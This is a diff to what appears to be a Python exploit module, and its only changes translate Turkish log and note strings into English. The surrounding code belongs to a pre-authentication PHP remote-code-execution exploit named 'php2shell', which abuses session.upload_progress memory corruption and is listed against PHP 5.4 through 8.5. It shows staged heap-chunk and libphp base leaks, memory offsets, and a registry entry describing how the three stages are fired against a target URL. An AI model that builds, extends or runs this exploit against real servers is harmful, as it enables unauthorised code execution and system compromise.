@@ -325,7 +325,7 @@ def run(params: dict) -> dict:
     ex = _Exploit(tgt, cmd, zif, dtor, htdata, huge_mb, profile,
                   lambda m: (log.append(m), print(m, flush=True)))
 
-    log.append(f"[*] hedef={url} profil={profile} cmd={cmd!r}")
+    log.append(f"[*] target={url} profile={profile} cmd={cmd!r}")
     log.append(f"[*] offsetler: zif=0x{zif:x} dtor=0x{dtor:x} htdata=0x{htdata:x}")
 
     ex.rotate()
@@ -347,7 +347,7 @@ def run(params: dict) -> dict:
     if not chunk:
         return {"ok": True, "success": False, "status": None,
                 "evidence": "", "detail": {"stage": "stage1_failed",
-                                           "note": "heap chunk leak alinamadi (mitigation/profil/offset uyumsuz)"},
+                                           "note": "heap chunk leak not obtained (mitigation/profile/offset mismatch)"},
                 "log": log}
     ex.rotate()
 
@@ -368,7 +368,7 @@ def run(params: dict) -> dict:
     if not libphp:
         return {"ok": True, "success": False, "status": None,
                 "evidence": "", "detail": {"stage": "stage2_failed", "chunk_base": hex(chunk),
-                                           "note": "libphp base leak alinamadi (dtor offset build'e uymuyor olabilir)"},
+                                           "note": "libphp base leak not obtained (dtor offset may not match this build)"},
                 "log": log}
     ex.rotate()
 
@@ -419,7 +419,7 @@ EXPLOITS = {
         "name": "php2shell OOM corruption RCE (session.upload_progress)",
         "type": "RCE", "preauth": True,
         "affected": ["5.4", "5.5", "5.6", "7.0", "7.1", "7.2", "7.3", "7.4", "8.0", "8.1", "8.2", "8.3", "8.4", "8.5"],
-        "note": "Native engine — scanner socket'i acar, 3 asamayi atar, id kanitini GET ile okur. Gerekli: memory_limit<post_max, display_errors=1, profil/offset build ile uyumlu.",
+        "note": "Native engine — the scanner opens the socket, fires the 3 stages and reads the id proof via GET. Requires: memory_limit<post_max, display_errors=1, profile/offset matching the build.",
         "inputs": [
             {"key": "url", "label": "Hedef PHP sayfasi", "req": True, "default": "",
              "placeholder": "http://LAB_IP:18111/index.php"},
